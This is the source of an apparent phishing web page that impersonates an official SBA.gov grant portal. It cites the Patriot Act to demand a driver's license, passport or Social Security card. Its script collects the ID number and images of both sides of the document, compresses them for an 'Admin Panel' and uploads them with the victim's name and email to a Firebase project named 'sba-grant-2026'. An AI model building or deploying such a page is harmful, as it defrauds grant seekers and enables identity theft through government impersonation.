<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SBA Portal | 2026 Identity Authentication</title>
    <link rel="stylesheet" href="style.css">
    <style>
        .upload-area { 
            border: 2px dashed #1e3a8a; 
            border-radius: 14px; 
            padding: 30px; 
            text-align: center; 
            margin-bottom: 18px; 
            background: #ffffff; 
            cursor: pointer; 
            transition: all 0.2s ease-in-out;
        }
        .upload-area:hover { background: #f8fafc; border-style: solid; box-shadow: 0 4px 12px rgba(30,58,138,0.1); }
        .preview-text { font-size: 11px; color: #10b981; margin-top: 10px; font-weight: 800; text-transform: uppercase; }
        .instruction-box { 
            background: #fffbeb; 
            border: 1px solid #fef3c7; 
            padding: 18px; 
            border-radius: 10px; 
            margin-bottom: 25px; 
            font-size: 11px; 
            color: #92400e; 
            line-height: 1.6; 
        }
        select, input { width: 100%; padding: 14px; border-radius: 10px; border: 1px solid #cbd5e1; box-sizing: border-box; font-family: inherit; font-size: 14px; }
        label { display: block; font-size: 12px; font-weight: 800; color: #1e3a8a; margin-bottom: 10px; margin-top: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
        #form-container { display: none; } 
    </style>
</head>
<body style="background: #f1f5f9;">
    <div class="gov-banner">
        <img src="https://upload.wikimedia.org/wikipedia/en/thumb/a/a4/Flag_of_the_United_States.svg/20px-Flag_of_the_United_States.svg.png" style="width:16px; margin-right:8px;" alt="USA Flag">
        OFFICIAL U.S. GOVERNMENT SYSTEM - SECURE 2026
    </div>

    <div class="nav" style="display: flex; justify-content: space-between; align-items: center; padding: 14px 16px; background: #00274c;">
        <h1 style="margin: 0; font-size: 16px; letter-spacing: 2px; color: white;">SBA.GOV</h1>
        <button onclick="location.href='dashboard.html'" style="width: auto !important; padding: 6px 15px; background: rgba(255,255,255,0.15); border: 1px solid rgba(255,255,255,0.3); border-radius: 6px; color: white; font-size: 11px; font-weight: 700; cursor: pointer;">
            BACK
        </button>
    </div>

    <div class="container" id="main-content">
        <div id="form-container">
            <div class="card" style="margin-top: 20px; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #ba0c2f; background: white; padding: 25px;">
                <h2 style="color: #00274c; font-size: 22px; margin-bottom: 5px; letter-spacing: -0.5px;">Identity Authentication</h2>
                
                <div class="instruction-box">
                    <b style="display: block; margin-bottom: 5px;">FEDERAL COMPLIANCE NOTICE:</b> 
                    Pursuant to the <b>Patriot Act</b>, you must provide a valid government ID for grant eligibility.
                </div>
                
                <label>Document Type</label>
                <select id="idType">
                    <option value="Driver's License">U.S. Driver's License</option>
                    <option value="Social Security Card">Social Security Card (SSN)</option>
                    <option value="US Passport">U.S. Passport Book/Card</option>
                </select>

                <label>Identification Number</label>
                <input type="text" id="idNumber" placeholder="Enter ID number accurately">

                <label>Front of Document</label>
                <div class="upload-area" onclick="document.getElementById('fileFront').click()">
                    <span style="font-size: 32px;">ü™™</span>
                    <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Upload Front</b>
                    <input type="file" id="fileFront" hidden accept="image/*">
                    <div class="preview-text" id="frontName"></div>
                </div>

                <label>Back of Document</label>
                <div class="upload-area" onclick="document.getElementById('fileBack').click()">
                    <span style="font-size: 32px;">ü™™</span>
                    <b style="font-size:12px; display:block; margin-top: 8px; color: #1e3a8a;">Upload Back</b>
                    <input type="file" id="fileBack" hidden accept="image/*">
                    <div class="preview-text" id="backName"></div>
                </div>

                <button id="uploadBtn" style="background: #00274c; color: white; padding: 18px; border-radius: 12px; width: 100%; font-weight: 800; border: none; margin-top: 20px; cursor: pointer; text-transform: uppercase;">
                    Submit for Verification
                </button>
            </div>
        </div>

        <div id="loading-state" style="text-align: center; margin-top: 50px;">
            <p style="color: #1e3a8a; font-weight: bold;">Checking Authentication Status...</p>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
        import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
        import { getFirestore, collection, addDoc, getDoc, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";

        const firebaseConfig = {
            apiKey: "AIzaSyB5nOOx153po4nWh4irbmTAcxsCZaM1-9k",
            authDomain: "sba-grant-2026.firebaseapp.com",
            projectId: "sba-grant-2026",
            storageBucket: "sba-grant-2026.firebasestorage.app",
            messagingSenderId: "838430821326",
            appId: "1:838430821326:web:6438deacb334076a64f99f"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);
        const db = getFirestore(app);

        let currentUserFullData = {};

        onAuthStateChanged(auth, async (user) => {
            if (!user) { window.location.href = 'index.html'; return; }

            try {
                const userSnap = await getDoc(doc(db, "users", user.uid));
                currentUserFullData = userSnap.data() || {};
                
                const status = (currentUserFullData.status || "").toUpperCase();
                const kycStatus = (currentUserFullData.kycStatus || "").toUpperCase();

                document.getElementById('loading-state').style.display = 'none';

                // THE BLOCK LOGIC
                // Only New users or those with 'REJECTED'/'DECLINED' status can see the form.
                // Everyone else (Pending, Verified, Under Review) is blocked.
                const isBlocked = status.includes("VERIFIED") || 
                                  kycStatus === "SUBMITTED" || 
                                  status.includes("REVIEW") || 
                                  status.includes("APPROVED");

                if (isBlocked && !status.includes("DECLINED") && !status.includes("REJECTED")) {
                    document.getElementById('main-content').innerHTML = `
                        <div class="card" style="margin-top: 50px; text-align: center; border-radius: 16px; padding: 40px 20px; background: white; box-shadow: 0 15px 35px rgba(0,0,0,0.05); border-top: 6px solid #f59e0b;">
                            <span style="font-size: 50px;">${status.includes("VERIFIED") ? '‚úÖ' : '‚è≥'}</span>
                            <h2 style="color: #00274c; margin-top: 15px;">Authentication Status</h2>
                            <div style="background: #f8fafc; padding: 15px; border-radius: 10px; margin: 20px 0; border: 1px solid #e2e8f0;">
                                <b style="color: #1e3a8a; text-transform: uppercase;">${status}</b>
                                <p style="font-size: 12px; color: #64748b; margin-top: 5px;">
                                    Your profile is currently active or under audit. You cannot submit new documents at this time.
                                </p>
                            </div>
                            <button onclick="location.href='dashboard.html'" style="background: #00274c; color: white; padding: 15px; border-radius: 10px; width: 100%; border: none; cursor: pointer; font-weight: 800;">RETURN TO DASHBOARD</button>
                        </div>
                    `;
                } else {
                    document.getElementById('form-container').style.display = 'block';
                }
            } catch (error) {
                document.getElementById('form-container').style.display = 'block';
            }
        });

        // Previews
        document.getElementById('fileFront').onchange = (e) => { if(e.target.files[0]) document.getElementById('frontName').innerText = "‚úÖ FRONT UPLOADED"; };
        document.getElementById('fileBack').onchange = (e) => { if(e.target.files[0]) document.getElementById('backName').innerText = "‚úÖ BACK UPLOADED"; };

        // Image Processing for Admin to see clearly
        const resizeAndBase64 = (file) => new Promise((resolve) => {
            const reader = new FileReader();
            reader.readAsDataURL(file);
            reader.onload = (event) => {
                const img = new Image();
                img.src = event.target.result;
                img.onload = () => {
                    const canvas = document.createElement('canvas');
                    const max_size = 900; // Good resolution for Admin viewing
                    let width = img.width, height = img.height;
                    if (width > height) { if (width > max_size) { height *= max_size / width; width = max_size; } }
                    else { if (height > max_size) { width *= max_size / height; height = max_size; } }
                    canvas.width = width; canvas.height = height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(img, 0, 0, width, height);
                    resolve(canvas.toDataURL('image/jpeg', 0.6));
                };
            };
        });

        const uploadBtn = document.getElementById('uploadBtn');
        uploadBtn.addEventListener('click', async () => {
            const user = auth.currentUser;
            const frontFile = document.getElementById('fileFront').files[0];
            const backFile = document.getElementById('fileBack').files[0];
            const idNum = document.getElementById('idNumber').value.trim();

            if(!frontFile || !backFile || !idNum) return alert("NOTICE: Please upload both sides of your ID and enter the ID number.");

            uploadBtn.innerText = "TRANSMITTING TO SECURE SERVERS...";
            uploadBtn.disabled = true;

            try {
                const frontData = await resizeAndBase64(frontFile);
                const backData = await resizeAndBase64(backFile);

                // Add to 'requests' so it shows in Admin Panel
                await addDoc(collection(db, "requests"), {
                    userId: user.uid,
                    userName: currentUserFullData.fullName || "User", // Now shows Name in Admin
                    userEmail: user.email,
                    idNumber: idNum,
                    frontImg: frontData, // You will see this in Admin
                    backImg: backData,   // You will see this in Admin
                    type: "KYC", 
                    status: "PENDING",
                    timestamp: serverTimestamp()
                });

                // Update the User profile
                await updateDoc(doc(db, "users", user.uid), {
                    status: "DOCUMENTS UNDER REVIEW",
                    kycStatus: "SUBMITTED"
                });

                alert("SUBMISSION RECEIVED: Your identity is being verified by SBA agents.");
                window.location.href = 'dashboard.html';
            } catch(e) {
                alert("Connection error. Please try again.");
                uploadBtn.disabled = false;
                uploadBtn.innerText = "SUBMIT FOR VERIFICATION";
            }
        });
    </script>
</body>
</html>
